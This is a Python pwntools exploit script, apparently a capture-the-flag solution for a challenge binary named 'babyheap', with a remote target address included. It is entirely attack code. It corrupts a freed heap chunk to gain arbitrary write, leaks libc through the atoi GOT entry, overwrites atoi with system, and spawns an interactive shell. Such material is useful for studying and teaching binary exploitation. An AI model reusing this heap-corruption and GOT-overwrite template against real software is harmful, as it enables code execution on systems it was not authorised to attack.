#!/usr/bin/env python
from pwn import *
# context.log_level = 'debug'
context.terminal = ['tmux', 'sp', '-h']
local = 1
if local:
	p = process('./babyheap', env={'LD_PRELOAD':'./libc.so.6'})
else:
	p = remote('51.68.189.144', 31005)
elf = ELF('./babyheap')
libc = ELF('./libc.so.6')
atoi_got = elf.got['atoi']
info('atoi_got = ' + hex(atoi_got))
buf = 0x006020A0
gdb.attach(p)

def create():
    p.sendafter('> ', '1')

def edit(data):
    p.sendafter('> ', '2')
    p.sendafter('Content? ', data)

def show():
    p.sendafter('> ', '3')

def delete():
    p.sendafter('> ', '4')

def fill(data):
    p.sendafter('> ', '1337')
    p.sendafter('Fill ', data)

create()
delete()
edit(p64(buf))
create()

payload = '\x00' * 0x28 + p64(atoi_got)
fill(payload)
show()
atoi = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
libc_base = atoi - libc.symbols['atoi']
success('libc_base = ' + hex(libc_base))

system = libc_base + libc.symbols['system']
edit(p64(system))
p.sendafter('> ', '/bin/sh')
p.interactive()

